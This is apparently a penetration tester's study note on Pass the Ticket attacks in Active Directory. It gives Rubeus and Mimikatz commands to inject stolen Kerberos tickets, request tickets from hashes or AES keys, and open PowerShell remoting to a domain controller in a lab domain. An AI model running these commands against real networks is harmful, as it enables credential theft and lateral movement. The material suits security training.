# Pass the Ticket (PtT) 
- https://lisandre.com/archives/14885
- https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/pass-the-ticket
- https://www.thehacker.recipes/ad/movement/kerberos/ptt
- https://www.thehacker.recipes/ad/movement/kerberos/ptt

## Theory
Another method for moving laterally in an Active Directory environment is called a Pass the Ticket (PtT) attack. In this attack, we use a stolen Kerberos ticket to move laterally instead of an NTLM password hash.

There are ways to come across (cached Kerberos tickets) or forge (overpass the hash, silver ticket and golden ticket attacks) Kerberos tickets. A ticket can then be used to authenticate to a system using Kerberos without knowing any password. This is called Pass the ticket. Another name for this is Pass the Cache (when using tickets from, or found on, UNIX-like systems).

## Practive 

> [!TIP] convert tickets UNIX <-> Windows
>
> Using [ticketConverter.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketConverter.py) we can convert kirbi files to ccache and vice-versa.
>
> ```bash
> ticketConverter.py <kirbi||ccache> <kirbi||ccache>
> ```

### Injecting the ticket
- On Windows systems, tools like [Mimikatz](https://github.com/gentilkiwi/mimikatz) and [Rubeus](https://github.com/GhostPack/Rubeus) can inject the ticket in memory. Native Microsoft tools can then use the ticket just like usual.
- On UNIX-like systems, the path to the .ccache ticket to use has to be referenced in the environment variable KRB5CCNAME

::: tabs

=== Windows
    
The most simple way of injecting the ticket is to supply the /ptt flag directly to the command used to request/create when [Passing the Key or OverPassing the Hash](#). Bothmimikatz and Rubeus accept this flag.

Another way is to import the ticket into the current session using the .kirbi file from the disk. Let's use a ticket exported from Mimikatz and import it.

Using Rubeus, we can perform a Pass the Ticket providing the base64 string instead of the file name.

To create a PowerShell Remoting session on a remote computer, you must have administrative permissions, be a member of the RemoteManagement  Users group, or have explicitPowerShell Remoting permissions in your session configuration.

Rubeus

```powershell
# Pass the Ticket 
> Rubeus.exe asktgt /domain:$DOMAIN /user:$USER /rc4:$NThash /ptt

# Pass the Ticket using kirbi 
> Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
```
        
We can also use the base64 output from Rubeus or convert a .kirbi to base64 to perform the Pass the Ticket attack. We can use PowerShell to convert a .kirbi to base64.

```powershell
# Convert .kirbi to Base64 Format
PS > [Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))

# Inject Base64 Format
> Rubeus.exe ptt /ticket:$base64
```

Rubeus has the option createnetonly, which creates a sacrificial process/logon session (Logon type 9). The process is hidden by default, but we can specify the flag /show to display the process, and the result is the equivalent of runas /netonly. This prevents the erasure of existing TGTs for the current logon session.

```powershell
# Create a Sacrificial Process
> Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
```

The above command will open a new cmd window. From that window, we can execute Rubeus to request a new TGT with the option /ptt to import the ticket into our current session and connect to the DC using PowerShell Remoting.

```powershell
> Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt
> powershell
> Enter-PSSession -ComputerName DC01
 ```

Note that now it displays Ticket successfully imported!.
    
    

    
Finally, we can also perform the Pass the Ticket attack using the Mimikatz module kerberos::ptt and the .kirbi file that contains the ticket we want to import.

```powershell
# Using kirbi
> mimikatz.exe 
> privilege::debug
> kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"
> exit
```

To use PowerShell Remoting with Pass the Ticket, we can use Mimikatz to import our ticket and then open a PowerShell console and connect to the target machine.

```powershell
# Powershell Remoting
> mimikatz.exe
> privilege::debug
> kerberos::ptt "C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"
> exit
> powershell
```

!!! Tip
    Instead of opening mimikatz.exe with cmd.exe and exiting to get the ticket into the current command prompt, we can use the Mimikatz module misc to launch a new command prompt window with the imported ticket using the `misc::cmd command.`

!!! Info
    dir \\DC01.inlanefreight.htb\c$    
    
!!! Tip
    It is then possible to list the tickets in memory using the `klist` command.



=== UNIX-like
### Using Impacket Tools
With ccache file obtained Passing the Key or Overpassing the Hash, to execute for example impacket tools, the ccache file needs to be exported to environment variable.

```bash
$ export KRB5CCNAME=<path_to_ticket>.ccache
```
:::